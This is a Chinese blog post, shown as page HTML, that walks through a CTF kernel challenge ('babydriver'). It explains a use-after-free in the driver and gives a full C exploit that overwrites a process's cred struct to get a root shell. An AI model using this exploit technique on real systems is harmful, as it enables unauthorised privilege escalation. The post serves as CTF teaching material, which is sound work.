<!DOCTYPE html>
<html style="display: none;" lang="zh">
    <head>
    <meta charset="utf-8">
    <meta name="baidu-site-verification" content="RC70b8mZ9A" />
    <meta name="msvalidate.01" content="325714A6172A8D425D843D8163893A54" />
    <meta name="google-site-verification" content="QAmqP2zEYaSBqoZ9w1x5RdOflLW2Fir2-yVs5LTIUxA" />
    <meta name="google-site-verification" content="QgUuEnRKG0PKdnDrOxnq55x7VxQbCiprrMJpfakMlow" />
    <!--
        © Material Theme
        https://github.com/viosey/hexo-theme-material
        Version: 1.5.0 -->
    <script>
        window.materialVersion = "1.5.0"
        // Delete localstorage with these tags
        window.oldVersion = [
            'codestartv1',
            '1.3.4',
            '1.4.0',
            '1.4.0b1'
        ]
    </script>


    <!-- dns prefetch -->
    <meta http-equiv="x-dns-prefetch-control" content="on">



    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>



        <link rel="dns-prefetch" href="https://cdn-city.livere.com"/>










    <!-- Title -->
    
    <title>
        
            linux_kernel_uaf漏洞利用实战 | 
        
        穷则变，变则通，通则久
    </title>

    <!-- Meta & Info -->
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="format-detection" content="telephone=no"/>
    <meta name="theme-color" content="#0097A7">
    <meta name="author" content="hac425">
    <meta name="description" itemprop="description" content="">
    <meta name="keywords" content=",modify cred,kernel rop">

    <!-- Import lsloader -->
    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>

    <!-- Import queue -->
    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>

    <!-- Favicons -->
    <link rel="icon shortcut" type="image/ico" href="/img/girl.png">
    <link rel="icon" sizes="192x192" href="/img/girl.png">
    <link rel="apple-touch-icon" href="/img/girl.png">

    <!--iOS -->
    <meta name="apple-mobile-web-app-title" content="Title">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="480">

    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">

    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="穷则变，变则通，通则久">

    <!-- Site Verification -->
    
    

    <!-- RSS -->
    

    <!--[if lte IE 9]>
        <link rel="stylesheet" href="/css/ie-blocker.css">

        
            <script src="/js/ie-blocker.zhCN.js"></script>
        
    <![endif]-->

    <!-- Import CSS -->
    
        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>

        

    

    

    <!-- Config CSS -->

<!-- Other Styles -->
<style>
  body, html {
    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
    overflow-x: hidden !important;
  }
  
  code {
    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
  }

  a {
    color: #00838F;
  }

  .mdl-card__media,
  #search-label,
  #search-form-label:after,
  #scheme-Paradox .hot_tags-count,
  #scheme-Paradox .sidebar_archives-count,
  #scheme-Paradox .sidebar-colored .sidebar-header,
  #scheme-Paradox .sidebar-colored .sidebar-badge{
    background-color: #0097A7 !important;
  }

  /* Sidebar User Drop Down Menu Text Color */
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
    color: #0097A7 !important;
  }

  #post_entry-right-info,
  .sidebar-colored .sidebar-nav li:hover > a,
  .sidebar-colored .sidebar-nav li:hover > a i,
  .sidebar-colored .sidebar-nav li > a:hover,
  .sidebar-colored .sidebar-nav li > a:hover i,
  .sidebar-colored .sidebar-nav li > a:focus i,
  .sidebar-colored .sidebar-nav > .open > a,
  .sidebar-colored .sidebar-nav > .open > a:hover,
  .sidebar-colored .sidebar-nav > .open > a:focus,
  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
    color: #0097A7 !important;
  }

  .toTop {
    background: #757575 !important;
  }

  .material-layout .material-post>.material-nav,
  .material-layout .material-index>.material-nav,
  .material-nav a {
    color: #757575;
  }

  #scheme-Paradox .MD-burger-layer {
    background-color: #757575;
  }

  #scheme-Paradox #post-toc-trigger-btn {
    color: #757575;
  }

  .post-toc a:hover {
    color: #00838F;
    text-decoration: underline;
  }

</style>


<!-- Theme Background Related-->

    <style>
      body{
        background-color: #F5F5F5;
      }

      /* blog_info bottom background */
      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
        background-color: #fff;
      }
    </style>




<!-- Fade Effect -->

    <style>
      .fade {
        transition: all 800ms linear;
        -webkit-transform: translate3d(0,0,0);
        -moz-transform: translate3d(0,0,0);
        -ms-transform: translate3d(0,0,0);
        -o-transform: translate3d(0,0,0);
        transform: translate3d(0,0,0);
        opacity: 1;
      }

      .fade.out{
        opacity: 0;
      }
    </style>


<!-- Import Font -->
<!-- Import Roboto -->

    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">


<!-- Import Material Icon -->

    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">




    <!-- Import jQuery -->
    
        <script>lsloader.load("jq_js","/js/jquery.min.js?ezyEvm8ST5CGfpA+kFFi1g==", true)</script>
    

    <!-- The Open Graph protocol -->
    <meta property="og:url" content="http://blog.hac425.top">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="linux_kernel_uaf漏洞利用实战 | 穷则变，变则通，通则久">
    <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
    <meta property="og:description" content="">
    <meta property="og:article:tag" content="modify cred"> <meta property="og:article:tag" content="kernel rop"> 

    
        <meta property="article:published_time" content="Mon Dec 18 2017 11:41:00 GMT+0800" />
        <meta property="article:modified_time" content="Mon Dec 18 2017 13:36:57 GMT+0800" />
    

    <!-- The Twitter Card protocol -->
    <meta name="twitter:title" content="linux_kernel_uaf漏洞利用实战 | 穷则变，变则通，通则久">
    <meta name="twitter:description" content="">
    <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:url" content="http://blog.hac425.top" />

    <!-- Add canonical link for SEO -->
    
        <link rel="canonical" href="http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html" />
    

    <!-- Structured-data for SEO -->
    
        


<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage": "http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html",
    "headline": "linux_kernel_uaf漏洞利用实战",
    "datePublished": "Mon Dec 18 2017 11:41:00 GMT+0800",
    "dateModified": "Mon Dec 18 2017 13:36:57 GMT+0800",
    "author": {
        "@type": "Person",
        "name": "hac425",
        "image": {
            "@type": "ImageObject",
            "url": "/img/girl.png"
        },
        "description": "纵横捭阖，冷心为上"
    },
    "publisher": {
        "@type": "Organization",
        "name": "穷则变，变则通，通则久",
        "logo": {
            "@type":"ImageObject",
            "url": "/img/girl.png"
        }
    },
    "keywords": ",modify cred,kernel rop",
    "description": "",
}
</script>


    

    <!-- Analytics -->
    
    
        <script>
    var _hmt = _hmt || [];
    (function() {var hm = document.createElement('script');
    hm.src = 'https://hm.baidu.com/hm.js?99747687c69d73d9102f032f78f03e96';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(hm, s);
    })();
</script>
    
    

    <!-- Custom Head -->
    

</head>


    
        <body id="scheme-Paradox" class="lazy">
            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
                

                <!-- Main Container -->
                <main class="material-layout__content" id="main">

                    <!-- Top Anchor -->
                    <div id="top"></div>

                    
                        <!-- Hamburger Button -->
                        <button class="MD-burger-icon sidebar-toggle">
                            <span class="MD-burger-layer"></span>
                        </button>
                    

                    <!-- Post TOC -->

    
    <!-- Back Button -->
    <!--
    <div class="material-back" id="backhome-div" tabindex="0">
        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
           href="#" onclick="window.history.back();return false;"
           target="_self"
           role="button"
           data-upgraded=",MaterialButton,MaterialRipple">
            <i class="material-icons" role="presentation">arrow_back</i>
            <span class="mdl-button__ripple-container">
                <span class="mdl-ripple"></span>
            </span>
        </a>
    </div>
    -->


    <!-- Left aligned menu below button -->
    
    
    <button id="post-toc-trigger-btn"
        class="mdl-button mdl-js-button mdl-button--icon">
        <i class="material-icons">format_list_numbered</i>
    </button>

    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最后"><span class="post-toc-number">3.</span> <span class="post-toc-text">最后</span></a></li></ol>
    </ul>
    




<!-- Layouts -->

    <!-- Post Module -->
    <div class="material-post_container">

        <div class="material-post mdl-grid">
            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">

                <!-- Post Header(Thumbnail & Title) -->
                
    <!-- Paradox Post Header -->
    
        
            <!-- Random Thumbnail -->
            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
            <script type="text/ls-javascript" id="post-thumbnail-script">
    var randomNum = Math.floor(Math.random() * 19 + 1);

    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
    $('.post_thumbnail-random').addClass('lazy');
</script>

        
    
            <p class="article-headline-p">
                linux_kernel_uaf漏洞利用实战
            </p>
        </div>





                
                    <!-- Paradox Post Info -->
                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">

    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>hac425</strong>
        <span>12月 18, 2017</span>
    </div>

    <div class="section-spacer"></div>

    <!-- Favorite -->
    <!--
        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
            <i class="material-icons" role="presentation">favorite</i>
            <span class="visuallyhidden">favorites</span>
        </button>
    -->

    <!-- Qrcode -->
    
        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">devices other</i>
    <span class="visuallyhidden">devices other</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
    
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAACy0lEQVR42u3aS5LbMAwFQN//0skJrHkPiFMesrlS2bLEphcofF5/rlwvbGxsbGxsbGxs7K9kv+L17lfvnrP5/AfAbM/Y2NjYR7OT1+S/et5Ejnw+9HrP2NjY2BewP7HR5+CXkJL9RO/FxsbGxg6un1OOWfjBxsbGxv40e1ZIyotE+aFgY2NjY+fhJC/6JKHrmbEPgdjY2Ng3sPOm6fdc/9f+NjY2NvYXs9v1nCS0oXH25OHOsbGxsQ9lt2lA3o59huUFqdk92NjY2Pew9wlAjtwEuXwE8+3n2NjY2New2zZAexzvnvmJtjE2Njb2bey8ZZvfk3zbBrnhr7CxsbEPZbdN1iQtyYtQsyMeFsKwsbGxD2W3jdh8E/kBzQYu60YyNjY29qHsvJzUNoCTO9vyU3vQ2NjY2Dez85ZAXpzal4fywxoGMGxsbOxfy06KOHnwyBOGfDxoHxSxsbGx72Hvg8qs2JQfRF7kwsbGxr6BPSvit0WofDAo39WqqISNjY19EDsv/c+OYHbEswD2Q7EMGxsb+2h2u9G8SdyW+Ntv81YBNjY29qnsFh+Fio+B2z1jY2Nj38B+xWtfhJpdz8LqKgPDxsbG/lXsfxvGktL/JlDlbYMobmNjY2Mfwd60TpPjaFsRs7Zu8rdhY2Njn81uqcl22wAz+zPyo8fGxsY+mz1LJzYbmh1ZW+rCxsbGxt40BqL0YD3uWZS9sLGxsS9gtw3g/SBO+wesdoKNjY19KLtdm7GeJAlpW7nFndjY2NiHsl/xasPSZgAob+IWe8bGxsY+mt0mCW1BalPuz1OmH5oc2NjY2Bew2+RhNnyzafe2CxsbGxu7HevJB3eSd22ax8P+NjY2NvY17LZJnCcY7bvywImNjY19A7t4xCiAta3ZfHwHGxsbGzsv0ORpQzsiuR/T+WB/GxsbG/uL2fcsbGxsbGxsbGxs7K9ZfwE5xXvuvOllngAAAABJRU5ErkJggg==">
    
</ul>

    

    <!-- Tags (bookmark) -->
    
    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
        <i class="material-icons" role="presentation">bookmark</i>
        <span class="visuallyhidden">bookmark</span>
    </button>
    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
        <li class="mdl-menu__item">
        <a class="post_tag-link" href="/tags/kernel-rop/">kernel rop</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/modify-cred/">modify cred</a>
    </ul>
    

    <!-- Share -->
    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    

    
        
            <!-- Busuanzi Views -->
            <a class="post_share-link" href="#">
                <li class="mdl-menu__item">
                    <span id="busuanzi_container_page_pv">
                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
                    </span>
                </li>
            </a>
        
    

    <!-- Share Weibo -->
    
        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=linux_kernel_uaf漏洞利用实战&url=http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
            <li class="mdl-menu__item">
                分享到微博
            </li>
        </a>
    

    <!-- Share Twitter -->
    
        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=linux_kernel_uaf漏洞利用实战&url=http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html&via=hac425" target="_blank">
            <li class="mdl-menu__item">
                分享到 Twitter
            </li>
        </a>
    

    <!-- Share Facebook -->
    
        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Facebook
            </li>
        </a>
    

    <!-- Share Google+ -->
    
        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Google+
            </li>
        </a>
    

    <!-- Share LinkedIn -->
    

    <!-- Share QQ -->
    

    <!-- Share Telegram -->
    
</ul>

</div>

                

                <!-- Post Content -->
                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
    
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好像是国赛的一道题。一个 <code>linux</code> 的内核题目。漏洞比较简单，可以作为入门。</p>
<p>题目链接: <a href="https://gitee.com/hac425/blog_data/blob/master/babydriver_0D09567FACCD2E891578AA83ED3BABA7.tar" target="_blank" rel="external">在这里</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目给了3个文件</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513568679114vw66vm9k.png?imageslim" alt="paste image"></p>
<p>分配是 根文件系统 ， 内核镜像， 启动脚本。解压运行 <code>boot.sh</code> 即可。 <code>vmware</code> 需要开启一个选项。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513568739772tfmi3nva.png?imageslim" alt="paste image"></p>
<p>使用 <code>lsmod</code> 可以找到加载的内核模块，以及它的加载地址。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513568821368hkanluaq.png?imageslim" alt="paste image"><br>多次启动发现，地址都没有变化，说明没有开启 <code>kaslr</code> ,从 <code>boot.sh</code> 中查看 <code>qemu</code> 启动选项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</div></pre></td></tr></table></figure>
<p>发现开启了 <code>smep</code>.</p>
<p>然后解压 <code>rootfs.cpio</code>, 拿出内核模块文件，用 <code>ida</code> 分析之。</p>
<p>使用</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513569109927l3as9qor.png?imageslim" alt="paste image"></p>
<p>解开 <code>rootfs.cpis</code> ，可以使用 <code>find</code> 命令搜索 <code>babydriver</code>, 可知 内核模块文件位于 <code>lib/modules/4.4.72/babydriver.ko</code>, 然后放到 <code>ida</code> 里面分析即可。</p>
<p>使用 <code>open</code> 开启设备时会，分配一块内存到 <code>babydev_struct.device_buf</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15135693016061fjw1ur0.png?imageslim" alt="paste image"></p>
<p>关闭设备时会直接 <code>kfree</code> 掉 <code>babydev_struct.device_buf</code>.<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513569353266d64hcmf1.png?imageslim" alt="paste image"></p>
<p><code>read</code> 和 <code>write</code> 非常正常的操作。</p>
<p><code>ioctl</code> 时我们可以让 驱动 重新分配我们想要的大小的内存。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513569436033sy1xc56v.png?imageslim" alt="paste image"></p>
<p>程序的漏洞在于 <code>babydev_struct</code> 是一个全局变量，所以如果我们打开两次该设备，就会有两个 <code>fd</code> 可以操作这个结构体，然后释放掉一个，另外剩下的那个就会指向一块已经 <code>free</code> 掉的内存， <code>UAF</code>.</p>
<p>由于开启了 <code>smep</code> ，我们不能使用 <code>ret2user</code>的攻击方式。下面介绍两种利用方法。</p>
<p><strong>修改 cred </strong></p>
<ul>
<li><p>进程的权限由 <code>uid</code> 决定，所以我们可以通过 <code>ioctl</code> 分配和 <code>cred</code>结构体同样大小的内存块</p>
</li>
<li><p>然后触发漏洞，<code>free</code> 掉它，接着通过 <code>fork</code> 创建进程，这样该进程的 <code>cred</code> 结构体就会使用刚刚 <code>free</code> 掉的内存。</p>
</li>
<li><p>而此时我们可以使用 <code>babydriver</code> 的 <code>write</code> 功能修改这块内存。</p>
</li>
<li><p>我们可以修改 <code>cred</code> 结构体中代表 <code>uid</code> 的区域 为 <code>0</code>,就实现了 <code>root</code></p>
</li>
</ul>
<p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">#include &lt;pthread.h&gt;</div><div class="line"></div><div class="line">#define CRED_SIZE 168</div><div class="line">#define DEV_NAME &quot;/dev/babydev&quot;</div><div class="line"></div><div class="line">char buf[100];</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    int fd1, fd2, ret;</div><div class="line">    char zero_buf[100];</div><div class="line">    memset(zero_buf, 0, sizeof(char) * 100);</div><div class="line">    fd1 = open(DEV_NAME, O_RDWR);</div><div class="line">    fd2 = open(DEV_NAME, O_RDWR);</div><div class="line">    // 首先通过ioctl改变第一次open的内存大小，使其和cred结构体一样大小</div><div class="line">    ret = ioctl(fd1, 0x10001, CRED_SIZE);</div><div class="line">    // release第一次open，释放一个cred结构体一样大小的内存</div><div class="line">    close(fd1);</div><div class="line">    // fork一个新进程来创建一个cred结构体，这个cred结构体就会用刚刚释放的内存，即UAF内存空间</div><div class="line">    int now_uid = 1000; // 当前uid为1000</div><div class="line">    int pid = fork();</div><div class="line">    if (pid &lt; 0) &#123;</div><div class="line">        perror(&quot;fork error&quot;);</div><div class="line">        return 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (!pid) &#123;</div><div class="line">        // 写入28个0，一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了</div><div class="line">        ret = write(fd2, zero_buf, 28);</div><div class="line">        now_uid = getuid();</div><div class="line">        if (!now_uid) &#123;</div><div class="line">            printf(&quot;get root done\n&quot;);</div><div class="line">            // 权限修改完毕，启动一个shell，就是root的shell了</div><div class="line">            system(&quot;/bin/sh&quot;);</div><div class="line">            exit(0);</div><div class="line">        &#125; else &#123;</div><div class="line">            puts(&quot;failed?&quot;);</div><div class="line">            exit(0);</div><div class="line">        &#125;</div><div class="line">    &#125; else &#123;</div><div class="line">        wait(NULL);</div><div class="line">    &#125;</div><div class="line">    close(fd2);</div><div class="line">    return 0;</div><div 